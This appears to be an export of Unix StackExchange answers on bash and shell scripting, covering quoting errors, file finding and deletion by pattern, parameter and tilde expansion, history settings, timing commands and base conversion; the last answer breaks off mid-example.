"unexpected EOF while looking for matching `""' - bash script","154427","<bash><shell>","43","<p>You can see your problem if you just look at your question. Note how the syntax highlighting is screwed up after line 95:</p>

<pre><code>echo -e ""Sorry, an error occurred. You have to run this on OS X""""
</code></pre>

<p>As the error message tells you, you have an unmatched <code>""</code>. Just remove the extra <code>""</code> from the line above and you should be fine:</p>

<pre><code>echo -e ""Sorry, an error occurred. You have to run this on OS X""
</code></pre>
"
"delete files matching pattern","84852","<bash><files><find><wildcards>","43","<p>A string contains “a number followed by an <code>x</code> followed by a number” if and only if it contains a digit followed by an <code>x</code> followed by a digit, i.e. if it contains a substring matching the pattern <code>[0-9]x[0-9]</code>. So you're looking to remove the files whose name matches the pattern <code>*[0-9]x[0-9]*[0-9]x[0-9]*.jpg</code>.</p>

<pre><code>find /path/to/directory -type f -name '*[0-9]x[0-9]*[0-9]x[0-9]*.jpg' -delete
</code></pre>

<p>If your <code>find</code> doesn't have <code>-delete</code>, call <code>rm</code> to delete the files.</p>

<pre><code>find /path/to/directory -type f -name '*[0-9]x[0-9]*[0-9]x[0-9]*.jpg' -exec rm {} +
</code></pre>
"
"Finding largest file recursively","158289","<bash><shell-script><recursive>","43","<p>use <code>find</code> (here assuming GNU <code>find</code>) to output file names with the file size. sort. print out the largest one.</p>

<pre><code>find . -type f -printf ""%s\t%p\n"" | sort -n | tail -1
</code></pre>

<p>That assumes file paths don't contain newline characters.</p>

<hr>

<p>Using a loop in <code>bash</code> with the GNU implementation of <code>stat</code>:</p>

<pre><code>shopt -s globstar
max_s=0
for f in **; do
  if [[ -f ""$f"" &amp;&amp; ! -L ""$f"" ]]; then
    size=$( stat -c %s -- ""$f"" )
    if (( size &gt; max_s )); then
      max_s=$size
      max_f=$f
    fi
  fi
done
echo ""$max_s $max_f""
</code></pre>

<p>This will be significantly slower than the find solution. That also assumes that file names don't end in newline characters and will skip hidden files and not descend into hidden directories.</p>

<p>If there's a file called <code>-</code> in the current directory, the size of the file open on stdin will be considered.</p>

<p>Beware that versions of <code>bash</code> prior to 4.3 followed symbolic links when descending the directory tree.</p>
"
"Replace all newlines to space except the last","114244","<bash><shell-script><text-processing><tr>","43","<p>You can use <code>paste -s -d ' ' file.txt</code>:</p>

<pre><code>$ cat file.txt
one line
another line
third line
fourth line

$ paste -s -d ' ' file.txt 
one line another line third line fourth line
</code></pre>
"
"How do ${0##*/} and ${0%/*} work?","22387","<bash><shell><wildcards><parameter>","42","<p>Those are not regular expressions, they are examples of Bash's parameter expansion: the substitution of a variable or a special parameter by its value. The Wooledge Wiki has <a href=""http://mywiki.wooledge.org/BashGuide/Parameters#Parameter_Expansion"">a good explanation</a>.</p>

<p>Basically, in the example you have, <code>${0##*/}</code> translates as:</p>

<blockquote>for the variable $0, and the pattern '/', the two hashes mean from the <em>beginning</em> of the parameter, delete the longest (or greedy) match&mdash;up to and including the pattern.</blockquote>

<p>So, where <code>$0</code> is the name of a file, eg., <code>$HOME/documents/doc.txt</code>, then the parameter would be expanded as: <code>doc.txt</code></p>

<p>Similarly, for <code>${0%/*}</code>, the pattern <code>/</code> is matched against the <em>end</em> of parameter (the <code>%</code>), with the shortest or non-greedy match deleted &ndash; which in the example above would give you <code>$HOME/documents</code>.</p>

<p>See also the article on the <a href=""http://wiki.bash-hackers.org/syntax/pe"">Bash Hacker's Wiki</a>.</p>
"
"How to permanently enable scl CentOS 6.4?","175851","<linux><bash><command-line><command><scl>","42","<p>In your <code>~/.bashrc</code> or <code>~/.bash_profile</code> Simply source the ""enable"" script provided with the devtoolset. For example, with the Devtoolset 2, the command is:</p>

<pre><code>source /opt/rh/devtoolset-2/enable
</code></pre>

<p>or</p>

<pre><code>source scl_source enable devtoolset-2
</code></pre>

<p>Lot more efficient: no forkbomb, no tricky shell</p>
"
"Is it possible to check where an alias was defined?","322459","<bash><terminal><bashrc>","42","<p>Manual definition will be hard to spot (the history logs, maybe) though asking the shell to show what it is doing and then <code>grep</code> should help find those set in a rc file:</p>

<pre><code>bash -ixlc : 2&gt;&amp;1 | grep ...
zsh -ixc : 2&gt;&amp;1 | grep ...
</code></pre>

<p>If the shell isn't precisely capturing the necessary options with one of the above invocations (that interactively run the null command), then <code>script</code>:</p>

<pre><code>script somethingtogrep thatstrangeshell -x
...
grep ... somethingtogrep
</code></pre>

<p>Another option would be to use something like <code>strace</code> or <code>sysdig</code> to find <em>all</em> the files the shell touches, then go <code>grep</code> those manually (handy if the shell or program does not have an <code>-x</code> flag); the standard RC files are not sufficient for a manual filename check if something like oh-my-zsh or site-specific configurations are pulling in code from who knows where (or also there may be environment variables, as sorontar points out in their answer).</p>
"
"Modify global variable in while loop","402750","<bash>","42","<p>In your example the while-loop is executed in a subshell, so changes to the variable inside the while-loop won't affect the external variable. This is because you're using the loop with a pipe, which automatically causes it to run in a subshell.</p>

<p>Here is an alternative solution using a while loop:</p>

<pre><code>i=1
while read x; do
   i=$(($i + 1))
   echo $i
done &lt;&lt;&lt;$(find tmp -type f)
echo $i
</code></pre>

<p>And here is the same approach using a for-loop:</p>

<pre><code>i=1
for x in $(find tmp -type f);
do 
   i=$(($i + 1))
   echo $i
done
echo $i
</code></pre>

<p>For more information see the following posts:</p>

<ul>
<li><p><a href=""https://stackoverflow.com/questions/16854280/a-variable-modified-inside-a-while-loop-is-not-remembered"">A variable modified inside a while loop is not remembered</a></p></li>
<li><p><a href=""https://stackoverflow.com/questions/13726764/bash-script-while-loop-subshell-dilemma"">Bash Script: While-Loop Subshell Dilemma</a></p></li>
</ul>

<p>Also look at the following chapter from the Advanced Bash Scripting Guide:</p>

<ul>
<li><a href=""http://tldp.org/LDP/abs/html/process-sub.html"" rel=""noreferrer"">Chapter 23. Process Substitution</a></li>
</ul>
"
"What is the difference between kill , pkill and killall?","252349","<linux><bash><shell-script><kill>","42","<p>The <code>kill</code> command is a very simple wrapper to the <code>kill</code> <em>system call</em>, which knows only about process IDs (PIDs). <code>pkill</code> and <code>killall</code> are also wrappers to the <code>kill</code> <em>system call</em>, (actually, to the libc library which directly invokes the system call), but can determine the PIDs for you, based on things like, process name, owner of the process, session id, etc. </p>

<p>How <code>pkill</code> and <code>killall</code> work can be seen using <code>ltrace</code> or <code>strace</code> on them. On Linux, they both read through the <code>/proc</code> filesystem, and for each pid (directory) found, traverses the path in a way to identify a process by its name or other attributes. How this is done is technically speaking, kernel and system specific. In general, they read from <code>/proc/&lt;PID&gt;/stat</code> which contains the command name as the 2nd field. For <code>pkill -f</code> and <code>pgrep</code> examine the <code>/cmdline</code> entry for each PID's proc entry.</p>

<p><code>pkill</code> and <code>pgrep</code> use the <code>readproc</code> system call, whereas <code>killall</code> does not. I couldn't say if there's a performance difference: you'll have to benchmark that on your own.</p>
"
"What Unix commands can be used as a semaphore/lock?","70","<scripting><bash><semaphore>","42","<p>If <code>lockfile</code> is not installed on your system, then <code>mkdir</code> will do
the work: it's an atomic operation, and it fails if the directory 
already exists (as long as you don't add the <code>-p</code> command-line
switch).</p>

<pre><code>create_lock_or_wait () {
  path=""$1""
  wait_time=""${2:-10}""
  while true; do
        if mkdir ""${path}.lock.d""; then
           break;
        fi
        sleep $wait_time
  done
}

remove_lock () {
  path=""$1""
  rmdir ""${path}.lock.d""
}
</code></pre>
"
"Grabbing the extension in a file name","1571","<bash><shell><filenames>","42","<p>If the file name is <code>file-1.0.tar.bz2</code>, the extension is <code>bz2</code>. The method you're using to extract the extension (<code>fileext=${filename##*.}</code>) is perfectly valid¹.</p>

<p>How do you decide that you want the extension to be <code>tar.bz2</code> and not <code>bz2</code> or <code>0.tar.bz2</code>? You need to answer this question first. Then you can figure out what shell command matches your specification.</p>

<ul>
<li><p>One possible specification is that extensions must begin with a letter. This heuristic fails for a few common extensions like <code>7z</code>, which might be best treated as a special case. Here's a bash/ksh/zsh implementation:</p>

<pre><code>basename=$filename; fileext=
while [[ $basename = ?*.* &amp;&amp;
         ( ${basename##*.} = [A-Za-z]* || ${basename##*.} = 7z ) ]]
do
  fileext=${basename##*.}.$fileext
  basename=${basename%.*}
done
fileext=${fileext%.}
</code></pre>

<p>For POSIX portability, you need to use a <code>case</code> statement for pattern matching.</p>

<pre><code>while case $basename in
        ?*.*) case ${basename##*.} in [A-Za-z]*|7z) true;; *) false;; esac;;
        *) false;;
      esac
do …
</code></pre></li>
<li><p>Another possible specification is that some extensions denote encodings and indicate that further stripping is needed. Here's a bash/ksh/zsh implementation (requiring <code>shopt -s extglob</code> under bash and <code>setopt ksh_glob</code> under zsh):</p>

<pre><code>basename=$filename
fileext=
while [[ $basename = ?*.@(bz2|gz|lzma) ]]; do
  fileext=${basename##*.}.$fileext
  basename=${basename%.*}
done
if [[ $basename = ?*.* ]]; then
  fileext=${basename##*.}.$fileext
  basename=${basename%.*}
fi
fileext=${fileext%.}
</code></pre>

<p>Note that this considers <code>0</code> to be an extension in <code>file-1.0.gz</code>.</p></li>
</ul>

<p>¹ <sub>
<code>${VARIABLE##SUFFIX}</code> and related constructs are in <a href=""http://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_06_02"" rel=""noreferrer"">POSIX</a>, so they work in any non-antique Bourne-style shell such as ash, bash, ksh or zsh.
</sub></p>
"
"How to remove ""You have mail"" welcome message","2432","<bash><terminal><login><email>","42","<p>It sounds like something has sent mail on (and to) the machine using the local mail exchanger. Most likely the email is an automated message from some installed package. Once you log in, type <code>mail</code> on the terminal to read and (presumably) delete the relevant mail. (Inside <code>mail</code>, use <code>?</code> to find out what the commands are.) Once you've read or deleted any unread mail, you won't see the ""You have mail"" message again until/unless something else sends mail in the same way. Odds are once you know what's sending you the mail, you can find a configuration option to change where it sends it to.</p>
"
"Excluding some of the commands from being getting stored in bash history","32460","<bash><command-history>","42","<p>You might want <code>$HISTIGNORE</code>: ""A colon-separated list of patterns used to decide which command lines should be saved on the history list."" This line in your ~/.bashrc should do the job:</p>

<pre><code>HISTIGNORE='rm *:svn revert*'
</code></pre>

<p>Also, you can add a space at the beginning of a command to exclude it from history. This works as long as <code>$HISTCONTROL</code> contains <code>ignorespace</code> or <code>ignoreboth</code>, which is default on any distro I've used.</p>
"
"Difference between executing multiple commands with && and ;","100704","<bash><shell>","41","<p>In the shell, <code>&amp;&amp;</code> and <code>;</code> are similar in that they both can be used to terminate commands. The difference is <code>&amp;&amp;</code> is also a conditional operator. With <code>;</code> the following command is always executed, but with <code>&amp;&amp;</code> the later command is only executed if the first succeeds.</p>

<pre><code>false; echo ""yes""   # prints ""yes""
true; echo ""yes""    # prints ""yes""
false &amp;&amp; echo ""yes"" # does not echo
true &amp;&amp; echo ""yes""  # prints ""yes""
</code></pre>

<p>Newlines are interchangeable with <code>;</code> when terminating commands.</p>
"
"Open a file given by the result of a command in vim","5863","<linux><bash><vim><find>","41","<p>You can use command substitution:</p>

<pre><code>vim $(find -name somefile.txt)
</code></pre>

<p>or </p>

<pre><code>find -name somefile.txt -exec vim {} \;
</code></pre>
"
"How can I use $variable in a shell brace expansion of a sequence?","7738","<shell><bash><brace-expansion>","41","<p>You may want to try :</p>

<pre><code>eval rm foo.{$ext0..$extN}
</code></pre>

<p>Not sure whether this is the best answer, but it certainly is one.</p>
"
"What's the difference between single and double equal signs (=) in shell comparisons?","72039","<bash><shell-script>","41","<p><code>[[ $a == $b ]]</code> is not comparison, it's pattern matching. You need <code>[[ $a == &quot;$b&quot; ]]</code> for byte-to-byte equality comparison. <code>=</code> is the same as <code>==</code> in any shell that supports <code>[[...]]</code> (introduced by <code>ksh</code>).</p>
<p><code>[[...]]</code> is not standard <code>sh</code> syntax. The <code>[</code> <em>command</em> is standard, and the standard <em>comparison</em> operator there is <code>=</code> (though some <code>[</code> implementations also recognise <code>==</code>).</p>
<p>Just like in any argument to any command, variable expansions must be quoted to prevent <em>split+glob</em> and empty removal (only the latter being performed in <code>zsh</code>), so:</p>
<pre><code>[ &quot;$a&quot; = &quot;$b&quot; ]
</code></pre>
<p>In standard <code>sh</code>, pattern matching is done with <code>case</code>:</p>
<pre><code>case $a in
  ($b) ...
esac
</code></pre>
<hr />
<p>For completeness, other <em>equality-like</em> operators you may come across in shell scripts:</p>
<ul>
<li><p><code>[ &quot;$a&quot; -eq &quot;$b&quot; ]</code>: standard <code>[</code> operator to compare decimal integer numbers. Some <code>[</code> implementations allow blanks around the numbers, some allow arbitrary arithmetic expressions, but that's not portable. Portably, one can use <code>[ &quot;$(($a))&quot; -eq &quot;$(($b))&quot; ]</code> for that. See also <code>[ &quot;$((a == b))&quot; -ne 0 ]</code> which would be the standard equivalent (except that POSIXly, the behaviour is only specified if <code>$a</code> and <code>$b</code> contain integer constants) of:</p>
</li>
<li><p><code>((a == b))</code>, from ksh and also found in <code>zsh</code> and <code>bash</code>, returns true if the evaluation of the arithmetic expression stored in <code>$a</code> yields the same number as that of <code>$b</code>. Typically, that's used for comparing numbers. Note that  there are variations between shells as to how arithmetic expressions are evaluated and what numbers are supported (for instance bash and some implementation/versions of ksh don't support floating point or treat numbers with leading zeros as octal).</p>
</li>
<li><p><code>expr &quot;$a&quot; = &quot;$b&quot;</code> does a number comparison if both operands are recognised as decimal integer numbers (some allowing blanks around the number), and otherwise checks if the two string operators have the same sorting order. It would also fail for values of <code>$a</code> or <code>$b</code> that are <code>expr</code> operators like <code>(</code>, <code>substr</code>...</p>
</li>
<li><p><code>awk 'BEGIN{exit !(ARGV[1] == ARGV[2])}' &quot;$a&quot; &quot;$b&quot;</code>: if <code>$a</code> and <code>$b</code> are recognised as numbers (at least decimal integer and floating point numbers like 1.2, -1.5e-4, leading trailing blanks ignored, some also recognising hexadecimal, octal or anything recognised by <code>strtod()</code>), then a numeric comparison is performed. Otherwise, depending on the implementation, it's either a byte-to-byte string comparison, or like for <code>expr</code> a <code>strcoll()</code> comparison, that is whether <code>$a</code> and <code>$b</code> sort  the same.</p>
</li>
</ul>
<p>See also:</p>
<ul>
<li><a href=""https://unix.stackexchange.com/q/56655/22565"">What is the difference between [[ $a == z* ]] and [ $a == z* ]?</a></li>
<li><a href=""https://unix.stackexchange.com/q/32210/22565"">using single or double bracket - bash</a></li>
</ul>
"
"Does ~ always equal $HOME","146671","<bash><shell><environment-variables><home>","41","<p>What's important to understand is that <code>~</code> expansion is a feature of the shell (of some shells), it's not a magic character than means your home directory wherever it's used.</p>

<p>It is expanded (by the shell, which is an application used to interpret command lines), like <code>$var</code> is expanded to its value under some conditions when used in a shell command line before the command is executed.</p>

<p>That feature first appeared in the C-shell in the late 1970s (the Bourne shell didn't have it, nor did its predecessor the Thompson shell), was later added to the Korn shell (a newer shell built upon the Bourne shell in the 80s). It was eventually standardized by POSIX and is now available in most shells including non-POSIX ones like <code>fish</code>.</p>

<p>Because it's in such widespread use in shells, some non-shell applications also recognise it as meaning the home directory. That's the case of many applications in their configuration files or their <em>own</em> command line (<code>mutt</code>, <code>slrn</code>, <code>vim</code>...).</p>

<p><code>bash</code> specifically (which is the shell of the GNU project and widely used in many Linux-based operating systems), when invoked as <code>sh</code>, mostly follows the <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_06_01"" rel=""noreferrer"">POSIX rules</a> about <code>~</code> expansion, and in areas not specified by POSIX, behaves mostly like the Korn shell (of which it is a part clone).</p>

<p>While <code>$var</code> is expanded in most places (except inside single quotes), <code>~</code> expansion, being an afterthought is only expanded in a few specific conditions.</p>

<p>It is expanded when on its own argument in list contexts, in contexts where a string is expected.</p>

<p>Here are a few examples of where it's expanded in <code>bash</code>:</p>

<ul>
<li><code>cmd arg ~ other arg</code></li>
<li><code>var=~</code></li>
<li><code>var=x:~:x</code> (required by POSIX, used for variables like <code>PATH</code>, <code>MANPATH</code>...)</li>
<li><code>for i in ~</code></li>
<li><code>[[ ~ = text ]]</code></li>
<li><code>[[ text = ~ ]]</code> (the expansion of <code>~</code> being taken as a pattern in AT&amp;T <code>ksh</code> but not <code>bash</code> since 4.0).</li>
<li><code>case ~ in ~) ...</code></li>
<li><code>${var#~}</code> (though not in some other shells)</li>
<li><code>cmd foo=~</code> (though not when invoked as <code>sh</code>, and only when what's on the left of the <code>=</code> is shaped like an unquoted <code>bash</code> variable name)</li>
<li><code>cmd ~/x</code> (required by POSIX obviously)</li>
<li><code>cmd ~:x</code> (but not <code>x:~:x</code> or <code>x-~-x</code>)</li>
<li><code>a[~]=foo; echo ""${a[~]} $((a[~]))""</code> (not in some other shells)</li>
</ul>

<p>Here are a few examples where it's not expanded:</p>

<ul>
<li><code>echo ""~"" '~'</code></li>
<li><code>echo ~@ ~~</code> (also note that <code>~u</code> is meant to expand to the home directory of user <code>u</code>).</li>
<li><code>echo @~</code></li>
<li><code>(( HOME == ~ ))</code>, <code>$(( var + ~ ))</code></li>
<li>with <code>extglob</code>: <code>case $var in @(~|other))...</code> (though <code>case $var in ~|other)</code> is OK).</li>
<li><code>./configure --prefix=~</code> (as <code>--prefix</code> is not a valid variable name)</li>
<li><code>cmd ""foo""=~</code> (in <code>bash</code>, because of the quotes).</li>
<li>when invoked as <code>sh</code>: <code>export ""foo""=~</code>, <code>env JAVA_HOME=~ cmd</code>...</li>
</ul>

<p>As to what it expands to: <code>~</code> alone expands to the content of the <code>HOME</code> variable, or when it is not set, to the home directory of the current user in the account database (as an extension since POSIX leaves that behaviour undefined).</p>

<p>It should be noted that in ksh88 and <code>bash</code> versions prior to 4.0, tilde expansion underwent globbing (filename generation) in list contexts:</p>

<pre><code>$ bash -c 'echo ""$HOME""'
/home/***stephane***
$ bash -c 'echo ~'
/home/***stephane*** /home/stephane
$ bash -c 'echo ""~""'
~
</code></pre>

<p>That should not be a problem in usual cases.</p>

<p>Note that because it's expanded, the same warning applies as other forms of expansions.</p>

<pre><code>cd ~
</code></pre>

<p>Doesn't work if <code>$HOME</code> starts with <code>-</code> or contains <code>..</code> components. So, even though it's very unlikely to ever make any difference, strictly speaking, one should write:</p>

<pre><code>cd -P -- ~
</code></pre>

<p>Or even:</p>

<pre><code>case ~ in
  (/*) cd -P ~;;
  (*) d=~; cd -P ""./$d"";;
esac
</code></pre>

<p>(to cover for values of <code>$HOME</code> like <code>-</code>, <code>+2</code>...) or simply:</p>

<pre><code>cd
</code></pre>

<p>(as <code>cd</code> takes you to your home directory without any argument)</p>

<p>Other shells have more advanced <code>~</code> expansions. For instance, in <code>zsh</code>, we have:</p>

<ul>
<li><code>~4</code>, <code>~-</code>, <code>~-2</code> (with completion) used to expand the directories in your directory stack (the places you've <code>cd</code> to before).</li>
<li><em>dynamic named directories</em>. You can define your own mechanism to decide how <code>~something</code> is being expanded.</li>
</ul>
"
"Understanding backtick (`)","48392","<bash><shell><command-substitution>","41","<p>Text between backticks is executed and replaced by the output of the command (minus the trailing newline characters, and beware that shell behaviors vary when there are NUL characters in the output). That is called <em>command substitution</em> because it is substituted with the output of the command. So if you want to print 5, you can't use backticks, you can use quotation marks, like <code>echo ""$b""</code> or just drop any quotation and use <code>echo $b</code>. </p>

<p>As you can see, since <code>$b</code> contains 5, when using backticks <code>bash</code> is trying to run command <code>5</code> and since there is no such command, it fails with error message.</p>

<p>To understand how backticks works, try running this:</p>

<pre><code>$ A=`cat /etc/passwd | head -n1`
$ echo ""$A""
</code></pre>

<p><code>cat /etc/passwd |head -n1</code> should print first line of <code>/etc/passwd</code> file. But since we use backticks, it doesn't print this on console. Instead it is stored in <code>A</code> variable. You can echo <code>$A</code> to this. Note that more efficient way of printing first line is using command <code>head -n1 /etc/passwd</code> but I wanted to point out that expression inside of backticks does not have to be simple.</p>

<p>So if first line of /etc/passwd is <code>root:x:0:0:root:/root:/bin/bash</code>, first command will be dynamically substituted by bash to <code>A=""root:x:0:0:root:/root:/bin/bash""</code>.</p>

<p>Note that this syntax is of the Bourne shell. Quoting and escaping becomes quickly a nightmare with it especially when you start nesting them. Ksh introduced the <code>$(...)</code> alternative which is now standardized (<a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_06_03"">POSIX</a>) and supported by all shells (even the Bourne shell from Unix v9). So you should use <code>$(...)</code> instead nowadays unless you need to be portable to very old Bourne shells.</p>

<p>Also note that the output of <code>`...`</code> and <code>$(...)</code> are subject to word splitting and filename generation just like variable expansion (in zsh, word splitting only), so would generally need to be quoted in list contexts.</p>
"
"How can I create a local function in my bashrc?","104755","<bash><bashrc>","41","<p>Use <code>unset</code> as last line in your <code>.bashrc</code>:</p>

<pre><code>unset -f do_stuff
</code></pre>

<p>will delete/unset the function <code>do_stuff</code>.</p>

<p>To delete/unset the variables invoke it as follows:</p>

<pre><code>unset variablename
</code></pre>
"
"Why does a bash here-string add a trailing newline char?","20157","<bash><text-processing>","41","<p>The easy answer is because ksh is written that way (and bash is compatible). But there's a reason for that design choice.</p>

<p>Most commands expect text input. In the unix world, <a href=""https://unix.stackexchange.com/questions/18743/whats-the-point-in-adding-a-new-line-to-the-end-of-a-file/18789#18789"">a text file consists of a sequence of lines, each ending in a newline</a>. So in most cases a final newline is required. An especially common case is to grab the output of a command with a command susbtitution, process it in some way, then pass it to another command. The command substitution strips final newlines; <code>&lt;&lt;&lt;</code> puts one back.</p>

<pre><code>tmp=$(foo)
tmp=${tmp//hello/world}
tmp=${tmp#prefix}
bar &lt;&lt;&lt;$tmp
</code></pre>

<p>Bash and ksh can't manipulate binary data anyway (it can't cope with null characters), so it's not surprising that their facilities are geared towards text data.</p>

<p>The <code>&lt;&lt;&lt;</code> here-string syntax is mostly only for convenience anyway, like <code>&lt;&lt;</code> here-documents. If you need to not add a final newline, use <code>echo -n</code> (in bash) or <code>printf</code> and a pipeline.</p>
"
"Why doesn't my ~/.bash_profile work?","88106","<bash><shell><login><profile>","41","<p>The file <code>~/.bash_profile</code> is read by bash when it is a login shell. That's what you get when you log in in text mode.</p>

<p>When you log in under X, the startup scripts are executed by <code>/bin/sh</code>. On Ubuntu and Mint, <code>/bin/sh</code> is <a href=""http://en.wikipedia.org/wiki/Debian_Almquist_shell"" rel=""noreferrer"">dash</a>, not bash. Dash and bash both have the same core features, but dash sticks to these core features in order to be fast and small whereas bash adds a lot of features at the cost of requiring more resources. It is common to use dash for scripts that don't need the extra features and bash for interactive use (though <a href=""http://en.wikipedia.org/wiki/Zsh"" rel=""noreferrer"">zsh</a> <a href=""https://unix.stackexchange.com/questions/983/what-features-are-in-zsh-and-missing-from-bash-or-vice-versa/985#985"">has a lot of nicer features</a>).</p>

<p>Most combinations of display manager (the program where you type your user name and password) and desktop environment read <code>~/.profile</code> from the login scripts in <code>/etc/X11/Xsession</code>, <code>/usr/bin/lightdm-session</code>, <code>/etc/gdm/Xsession</code> or whichever is applicable. So put your environment variable definitions in <code>~/.profile</code>. Make sure to use only syntax that dash supports.</p>

<p>So what should you put where?</p>

<ul>
<li><p>A good <code>.bash_profile</code> loads <code>.profile</code>, and loads <code>.bashrc</code> if the shell is interactive.</p>

<pre><code>. ~/.profile
if [[ $- == *i* ]]; then . ~/.bashrc; fi
</code></pre></li>
<li><p>In <code>.profile</code>, put environment variable definitions, and other session settings such as <code>ulimit</code>.</p></li>
<li>In <code>.bashrc</code>, put bash interactive settings such as aliases, functions, completion, key bindings (that aren't in <code>.inputrc</code>), …</li>
</ul>

<p>See also <a href=""https://unix.stackexchange.com/questions/38175/difference-between-login-shell-and-non-login-shell/46856#46856"">Difference between Login Shell and Non-Login Shell?</a> and <a href=""https://unix.stackexchange.com/questions/3052/alternative-to-bashrc/3085#3085"">Alternative to .bashrc</a>.</p>
"
"How do you time how long a command took to run?","86632","<bash><date><time>","41","<p>use <code>time</code>:</p>

<pre><code>$ time longrunningcommand --takeyourtime
</code></pre>

<p><code>time</code> will execute the rest of the command line as a command  (in this example <code>longrunningcommand --takeyourtime</code>) and when the command is done it will print the elapsed time.</p>

<p>another example: <code>time foo --bar</code> will execute <code>foo --bar</code> and wait for it to finish and then print the elapsed time.</p>

<p><code>time</code> is a builtin command in most shells. the difference of the shell builtin and the system command is mostly the format of the output. see below for more elaboration on the differences.</p>

<p>if you want to use the system <code>time</code> do it like this:</p>

<pre><code>$ /usr/bin/time longrunningcommand --getsomecoffee
</code></pre>

<p>or like this:</p>

<pre><code>$ \time longrunningcommand --callmom
$ command time longrunningcommand --callmom
</code></pre>

<p>the backslash works in bash and maybe some other shells. <code>command</code> works in most shells.</p>

<hr>

<p>more elaborate examples</p>

<p>example <code>longrunningcommand</code>:</p>

<pre><code>#!/bin/sh

echosleep() {
  seq $1 | while read tick; do
    echo $tick
    sleep 1
  done
  echo done
}

case $1 in
  --takeyourtime) echosleep 4 ;;
  --getsomecoffee) echosleep 5 ;;
  --callmom) echosleep 6 ;;
  *) echo wat ;;
esac
</code></pre>

<p>example invocation:</p>

<pre><code>$ ./longrunningcommand --takeyourtime
1
2
3
4
done
</code></pre>

<p>(with delay between each line of output)</p>

<p>example invocation using bash builtin <code>time</code>:</p>

<pre><code>$ time ./longrunningcommand --getsomecoffee
1
2
3
4
5
done

real    0m5,020s
user    0m0,010s
sys 0m0,010s
</code></pre>

<p>the interesting information is <code>real    0m5,020s</code>. for more information about the other numbers see here: <a href=""https://stackoverflow.com/questions/556405/what-do-real-user-and-sys-mean-in-the-output-of-time1"">https://stackoverflow.com/questions/556405/what-do-real-user-and-sys-mean-in-the-output-of-time1</a></p>

<p>example invocation using system <code>time</code>:</p>

<pre><code>$ \time ./longrunningcommand --callmom
1
2
3
4
5
6
done
0.00user 0.01system 0:06.02elapsed 0%CPU (0avgtext+0avgdata 3656maxresident)k
0inputs+0outputs (0major+1089minor)pagefaults 0swaps
</code></pre>

<p>the interesting information is <code>0:06.02elapsed</code>. for the meaning of the other numbers read the man page of <code>time</code>: <a href=""http://man7.org/linux/man-pages/man1/time.1.html"" rel=""noreferrer"">http://man7.org/linux/man-pages/man1/time.1.html</a></p>

<p>you can change the output of the system <code>time</code>. observe:</p>

<pre><code>$ \time sleep 0.5
0.00user 0.00system 0:00.50elapsed 0%CPU (0avgtext+0avgdata 2376maxresident)k
0inputs+0outputs (0major+81minor)pagefaults 0swaps
$ \time -p sleep 0.5
real 0.50
user 0.00
sys 0.00
$ \time -f %E sleep 0.5
0:00.50
</code></pre>

<hr>

<p>how to redirect or capture the output</p>

<p>for demonstration observe command <code>hellostdoutstderr</code>:</p>

<pre><code>#!/bin/sh
sleep 0.5
echo stdout
echo stderr &gt;&amp;2
</code></pre>

<p>example invocations:</p>

<pre><code> $ ./hellostdoutstderr 
stdout
stderr
$ ./hellostdoutstderr &gt;stdout 2&gt;stderr
$ cat stdout
stdout
$ cat stderr
stderr
</code></pre>

<p>the bash builtin <code>time</code> prints the terminal even if stdout and stderr is redirected because it is a builtin and can do whatever it likes (in the shell)</p>

<pre><code>$ time ./hellostdoutstderr &gt;stdout 2&gt;stderr

real    0m0,511s
user    0m0,005s
sys 0m0,006s
</code></pre>

<p>to still redirect this output read here: <a href=""https://stackoverflow.com/questions/18348593/how-can-i-output-from-usr-bin-time-to-a-file-at-the-right-location-within-execu"">https://stackoverflow.com/questions/18348593/how-can-i-output-from-usr-bin-time-to-a-file-at-the-right-location-within-execu</a></p>

<p>or here: <a href=""https://www.cyberciti.biz/faq/unix-linux-time-command-examples-usage-syntax/"" rel=""noreferrer"">https://www.cyberciti.biz/faq/unix-linux-time-command-examples-usage-syntax/</a></p>

<p>the system <code>time</code> prints to stderr like it should</p>

<pre><code>$ \time ./hellostdoutstderr &gt;stdout 2&gt;stderr
$ cat stdout
stdout
$ cat stderr
stderr
0.00user 0.00system 0:00.50elapsed 1%CPU (0avgtext+0avgdata 3672maxresident)k
0inputs+16outputs (0major+311minor)pagefaults 0swaps
</code></pre>

<p>you can tell <code>time</code> to print to a separate file</p>

<pre><code>$ \time -o timeout ./hellostdoutstderr &gt;stdout 2&gt;stderr
$ cat stderr
stderr
$ cat timeout 
0.00user 0.00system 0:00.50elapsed 1%CPU (0avgtext+0avgdata 3676maxresident)k
0inputs+16outputs (0major+309minor)pagefaults 0swaps
</code></pre>
"
"How to Navigate within bash's Reverse Search?","39273","<bash><command-history><search>","40","<p>You can access this via the <code>forward-search-history</code> function which is bind per default to <kbd>ctrl+s</kbd>. Unfortunately <kbd>ctrl+s</kbd> is used to signal <code>xoff</code> per default which means you can't use it to change the direction of the search. There are two solutions for solving the problem, one disabling sending the <code>xoff/xon</code> signaling and the other change the keybinding for <code>forward-search-history</code> </p>

<h1>Disable xon/xoff</h1>

<p>Run <code>stty -ixon</code> in your terminal or add it to your <code>~/.bashrc</code>. This allows you to use <kbd>ctrl+s</kbd> to use the <code>forward-search-history</code> history function.</p>

<p>For more information about control flow have a look at <a href=""https://unix.stackexchange.com/questions/12107/how-to-unfreeze-after-accidentally-pressing-ctrl-s-in-a-terminal"">How to unfreeze after accidentally pressing Ctrl-S in a terminal?</a> and some of the answers</p>

<h1>Change the keybinding</h1>

<p>If you don't want to change the default behavior of <kbd>ctrl+s</kbd> you can change the keybinding for <code>forward-search-history</code> with <code>bind</code>. As most keys are already defined in bash you may have to get creative:</p>

<pre><code>bind ""\C-t"":forward-search-history
</code></pre>

<p>This will bind <kbd>ctrl+t</kbd> to forward-search-history, but please be aware that per default <kbd>ctrl+t</kbd> runs <code>transpose-chars</code></p>
"
"BASH base conversion from decimal to hex","191205","<bash><shell><text-processing><hex>","40","<p>With <code>bash</code> (or any shell, provided the <code>printf</code> command is available (a standard POSIX command often built in the shells)):</p>
<pre><code>printf '%x\n' 85
</code></pre>
<p>​​​​​​​​​​​​​​​​​
With <code>zsh</code>, you can also do:</p>
<pre><code>dec=85
hex=$(([##16]dec))
</code></pre>
<p>That works for bases from 2 to 36 (with <code>0-9a-z</code> case insensitive as the digits).</p>
<p>With <code>ksh93</code>, you can use:</p>
<pre><code>dec=85
